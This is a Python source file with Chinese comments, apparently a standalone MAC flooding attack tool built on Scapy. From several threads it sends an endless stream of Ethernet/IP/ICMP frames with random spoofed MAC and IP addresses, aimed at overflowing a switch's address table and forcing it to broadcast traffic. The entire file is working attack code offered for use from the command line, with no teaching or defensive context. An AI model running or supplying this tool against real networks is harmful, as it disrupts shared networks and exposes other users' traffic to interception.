#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MAC洪泛攻击工具
通过发送大量虚假MAC地址使交换机进入广播模式
"""

import random
import time
import threading
from scapy.all import *

class MACFlood:
    def __init__(self):
        self.running = False
        self.threads = []
        
    def generate_random_mac(self):
        """生成随机MAC地址"""
        return "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
    
    def generate_random_ip(self):
        """生成随机IP地址"""
        return "192.168.%d.%d" % (
            random.randint(1, 254),
            random.randint(1, 254)
        )
    
    def flood_packets(self, interface):
        """发送洪泛包"""
        packet_count = 0
        
        while self.running:
            try:
                # 生成随机源和目标MAC、IP
                src_mac = self.generate_random_mac()
                dst_mac = self.generate_random_mac()
                src_ip = self.generate_random_ip()
                dst_ip = self.generate_random_ip()
                
                # 构造随机数据包
                packet = (
                    Ether(src=src_mac, dst=dst_mac) /
                    IP(src=src_ip, dst=dst_ip) /
                    ICMP()
                )
                
                # 发送包
                sendp(packet, iface=interface, verbose=0)
                
                packet_count += 1
                if packet_count % 100 == 0:
                    print(f"[*] 已发送 {packet_count} 个洪泛包")
                
            except Exception as e:
                print(f"[!] 包发送失败: {e}")
                time.sleep(0.1)
    
    def start_attack(self, interface, thread_count=3):
        """启动攻击"""
        self.running = True
        print(f"[*] 启动MAC洪泛攻击，使用 {thread_count} 个线程")
        print("[!] 警告: 此攻击可能影响整个网络性能")
        
        for i in range(thread_count):
            thread = threading.Thread(target=self.flood_packets, args=(interface,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        print("[*] 攻击进行中... 按Ctrl+C停止")
    
    def stop_attack(self):
        """停止攻击"""
        print("[*] 停止MAC洪泛攻击")
        self.running = False
        
        for thread in self.threads:
            thread.join(timeout=2)
        
        self.threads.clear()
        print("[+] 攻击已停止")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='MAC洪泛攻击工具')
    parser.add_argument('-i', '--interface', required=True, help='网络接口')
    parser.add_argument('-t', '--threads', type=int, default=3, help='线程数量')
    
    args = parser.parse_args()
    
    tool = MACFlood()
    
    try:
        tool.start_attack(args.interface, args.threads)
        
        # 等待用户中断
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        tool.stop_attack()